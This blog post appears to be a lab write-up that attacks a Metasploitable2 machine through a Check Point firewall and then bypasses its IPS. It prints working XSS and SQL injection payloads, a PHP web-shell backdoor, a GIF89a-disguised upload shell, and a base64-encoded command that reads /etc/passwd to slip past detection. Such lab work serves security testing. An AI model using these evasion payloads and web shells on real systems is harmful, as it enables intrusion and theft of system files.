<!DOCTYPE html>

<!--
  portfolYOU Jekyll theme by Youssef Raafat
  Free for personal and commercial use under the MIT license
  https://github.com/YoussefRaafatNasry/portfolYOU
-->

<html lang="en" class="h-100">

<head>

  
  

  

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:type" content="website">
  <meta property="og:title" content="Bypass IPS in Check Point Firewall">
  <meta property="og:description" content="TBypass IPS in Check Point Firewall">

  <title>Bypass IPS in Check Point Firewall</title>
  <meta name="description" content="TBypass IPS in Check Point Firewall">

  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">

  <!-- Theme style -->
  <script src="/assets/js/theme.js"></script>

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.10.0/css/all.css">

  <!-- Bootstrap CSS CDN -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">

  <!-- Animate CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">

  <!-- Custom CSS -->
  <link rel="stylesheet" href="/assets/css/style.css">

</head>

<body class="h-100 d-flex flex-column">

  <main class="flex-shrink-0 container mt-5">
    <nav class="navbar navbar-expand-lg navbar-themed">

  <a class="navbar-brand" href="/"><h5><b>CyberY</b></h5></a>

  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
    <i class="fas fa-1x fa-bars text-themed"></i>
  </button>

  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>

      <a class="nav-item nav-link active" href="/blog/">Blog</a>

      <a class="nav-item nav-link " href="/about/">About</a>

      <a class="nav-item nav-link " href="/notion/">Notion</a>

      

      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
    </div>
  </div>

</nav>
    <div class="col-lg-10 mx-auto mt-5 markdown-body">
  <h1><b>Bypass IPS in Check Point Firewall</b></h1>

<p class="post-metadata text-muted">
  07 November 2021 -  
  <b>4 mins read time</b>

  <br>Tags: 
    
    <a class="text-decoration-none no-underline" href="/blog/tags#ips">
      <span class="tag badge badge-pill text-primary border border-primary">IPS</span>
    </a>
    
    <a class="text-decoration-none no-underline" href="/blog/tags#check-point-firewall">
      <span class="tag badge badge-pill text-primary border border-primary">Check point Firewall</span>
    </a>
    </p>

<h3 id="what-is-intrusion-prevention-system-ips">What is <strong>Intrusion Prevention System (IPS)</strong></h3>

<p>Intrusion Prevention Systems detect or prevent attempts to exploit weaknesses in vulnerable systems or applications, protecting you in the race to exploit the latest breaking threat. Check Point IPS protections in our Next Generation Firewall are updated automatically. Whether the vulnerability was released years ago, or a few minutes ago, your organization is protected.[<a href="https://www.checkpoint.com/quantum/intrusion-prevention-system-ips/">source</a>]</p>

<p>In simple words IPS try to detect and prevent any attempts to exploit your system or your application.</p>

<p>In this lab I will try to bypass IPS blade.</p>

<h3 id="lab-requirements">Lab Requirements</h3>

<ol>
  <li>kali Linux as attacker</li>
  <li>metsploitable2 as vulnerable machine</li>
  <li>Check Point Firewall R80.40</li>
</ol>

<h2 id="without-ips-blade">Without IPS Blade</h2>

<p>lets start without enabling the IPs blade and see what we can attack and exploit.</p>

<p><img src="https://www.notion.so/Bypass-IPS-in-Check-Point-Firewall-de5e16062aae49d6b2f3aba95c85823e#82cea71d8e1646628cdc7a33f0223e69" alt="Untitled" /></p>

<p>From Kali Linux letâ€™s perform some common attacks like XSS, SQLi, and upload files.</p>

<h4 id="--reflected-xss">- Reflected XSS</h4>

<p>simple payload</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>alert('CyberY')<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div></div>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/50dd3d31-c624-43e0-bdc7-9826590b6aa0/Untitled.png" alt="Untitled" /></p>

<p>As we can see payload successfully executed.</p>

<h4 id="--sql-injection">- SQL Injection</h4>

<p>simple payload</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' or 1--
</span></code></pre></div></div>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/797913ec-25c9-47cd-91ce-f935b90e3cca/Untitled.png" alt="Untitled" /></p>

<p>we can retrieve all the users simply.</p>

<h4 id="--file-upload">- File Upload</h4>

<p>lets upload simple backdoor</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>

<span class="cp">&lt;?php</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
        <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
        <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div></div>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/66968fd8-37ff-422d-aef1-c7f618da3783/Untitled.png" alt="Untitled" /></p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/abfdc2e2-dd59-4a9a-9a4b-fdc470afb66b/Untitled.png" alt="Untitled" /></p>

<p>got a remote code execution.</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9cd4e3b1-34a0-414b-9460-9c4837392450/Untitled.png" alt="Untitled" /></p>

<h2 id="enable-ips-blade">Enable IPS Blade</h2>

<ol>
  <li>In check point firewall double click on the firewall name.</li>
  <li>In Threat Prevention select IPS.</li>
  <li>Click OK.</li>
</ol>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f3e0107a-d4b1-4082-a7a6-e86d09a471f4/Untitled.png" alt="Untitled" /></p>

<p>you should see IPS blade enabled.</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c156bcd3-de43-448e-b03d-51a1c826e43f/Untitled.png" alt="Untitled" /></p>

<ol>
  <li>Click on Security Policies in the left side.</li>
  <li>Under Threat Prevention select Policy.</li>
  <li>Right click under Action and select Strict.</li>
</ol>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/507da690-4d03-4ba2-b52e-c1a5daeccda7/Untitled.png" alt="Untitled" /></p>

<p>7.Publish and install the policies.</p>

<p>Lets try to exploit and see the behavior.</p>

<h2 id="exploitation">Exploitation</h2>

<h4 id="--xss-reflected">- XSS reflected</h4>

<p>with same payload failed.</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b33740a9-eeb9-41d7-ba6d-846d3dc42cdd/Untitled.png" alt="Untitled" /></p>

<h4 id="--sql-injection-1">- SQL Injection</h4>

<p>with same payload failed.</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1088ee9c-09cf-4c09-8524-e50f777de7cd/Untitled.png" alt="Untitled" /></p>

<h4 id="--file-upload-1">- File Upload</h4>

<p>failed.</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/36627d7f-cf61-482d-8bbd-404611bc95a1/Untitled.png" alt="Untitled" /></p>

<h5 id="this-meaning-the-ips-working-great">This meaning the IPS working great.</h5>

<p>Check the logs in the firewall.</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/63a249bb-a6f9-4768-a212-9dbeb1fbe6e6/Untitled.png" alt="Untitled" /></p>

<p>you can double click and see the details</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ef556d7c-df4e-4e68-8bf2-73d9b18763b4/Untitled.png" alt="Untitled" /></p>

<h2 id="bypass-ips-in-check-point-firewall">Bypass IPS in Check Point Firewall</h2>

<p>After we see the behavior of the IPS lets bypass it.</p>

<p>to bypass it we have to know how IPS identification works for this I suggest to watch the below video.</p>

<p><a href="https://www.youtube.com/watch?v=hEgWPWIuq_s&amp;ab_channel=ProfessorMesser">https://www.youtube.com/watch?v=hEgWPWIuq_s&amp;ab_channel=ProfessorMesser</a></p>

<p>Now we are ready to go, to make this easy we can take help from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadALLThings</a> in github.</p>

<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF</a></p>

<h4 id="--xss-reflected-1">- XSS reflected</h4>

<p>The only obstacle to bypass the IPS is to find action upon the
error. alert(), prompt(), confirm(), and eval() were all blocked, so we would have to look for other alternatives to create a proof of concept to show the existence of cross-site scripting vulnerabilities.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="dl">'</span><span class="s1">"&gt;&lt;img/src/onerror=.1|alert`CyberY`&gt;
</span></code></pre></div></div>

<p>By this payload we are able to bypass IPS and preform reflected XSS.</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3c1c24dc-6907-4c7f-b6ac-e4e0f814a851/Untitled.png" alt="Untitled" /></p>

<h4 id="--sql-injection-2">- SQL Injection</h4>

<p>After long search I bypass it by replacing the space with <strong>/*! */</strong> as following payload [<a href="https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli">source</a>]</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">'/*! */or/*! */'</span><span class="mi">1</span><span class="cm">/*! */</span><span class="c1">--/*! */</span>
</code></pre></div></div>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c8dfc4a0-732e-4dcc-8831-50e27dd891e5/Untitled.png" alt="Untitled" /></p>

<h4 id="--file-upload-2">- File Upload</h4>

<p>After some attempts I got to know that the IPS check the content type, to bypass this we can put <strong>GIF89a;</strong> header.</p>

<p>The payload is</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">GIF89a</span><span class="p">;</span>
<span class="o">&lt;?</span>
<span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="c1"># shellcode goes here</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Uploaded with php extension means the IPS never check the extension of the file.</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a72351e2-62e4-40ee-bc54-710676291a8a/Untitled.png" alt="Untitled" /></p>

<p>navigate to the url, then type ?cmd=whoami</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed374d8b-b62b-4e9d-aa55-b819f8183013/Untitled.png" alt="Untitled" /></p>

<p>another interesting thing that IPS block me from doing cat /etc/passwd</p>

<p>To bypass it I encoded the command as following</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span><span class="nv">Y2F0IC9ldGMvcGFzc3dkCg</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</code></pre></div></div>

<p>and here we go ðŸ˜€</p>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4e4e7fd-e1a0-4b9f-be26-03135754f17b/Untitled.png" alt="Untitled" /></p>

<h3 id="thanks-for-reading-hope-you-enjoyed">Thanks for reading, hope you enjoyed.</h3>



</div>
  </main>

  <footer class="mt-auto py-3 text-center">

  <small class="text-muted mb-2">
    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
    by <strong>Abdullah Baghuth</strong>
  </small>

  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:abdullahsalem7737@gmail.com"
       style="color: #6c757d"
       onMouseOver="this.style.color='#db4437'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fas fa-envelope fa-1x"></i>
    </a><a class="social mx-1"  href="https://www.facebook.com/https://www.facebook.com/abdullah.salem.baghuth"
       style="color: #6c757d"
       onMouseOver="this.style.color='#3b5998'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fab fa-facebook fa-1x"></i>
    </a><a class="social mx-1"  href="https://www.github.com/https://github.com/0xCyberY"
       style="color: #6c757d"
       onMouseOver="this.style.color='#333333'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fab fa-github fa-1x"></i>
    </a><a class="social mx-1"  href="https://www.linkedin.com/in/https://www.linkedin.com/in/abdullah-baghuth-934303107/"
       style="color: #6c757d"
       onMouseOver="this.style.color='#007bb5'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fab fa-linkedin-in fa-1x"></i>
    </a><a class="social mx-1"  href="https://medium.com/@https://abdullahbaghuth.medium.com/"
       style="color: #6c757d"
       onMouseOver="this.style.color='#00ab6c'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fab fa-medium fa-1x"></i>
    </a><a class="social mx-1"  href="https://www.twitter.com/https://twitter.com/0xCyberY"
       style="color: #6c757d"
       onMouseOver="this.style.color='#1da1f2'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fab fa-twitter fa-1x"></i>
    </a>

</div><small id="attribution">
    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
  </small>
  
</footer>

  
  <!-- GitHub Buttons -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<!-- jQuery CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Popper.js CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>

<!-- Bootstrap JS CDN -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<!-- wow.js CDN & Activation -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
<script> new WOW().init(); </script>

<!-- Initialize all tooltips -->
<script>
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
})
</script>


</body>

</html>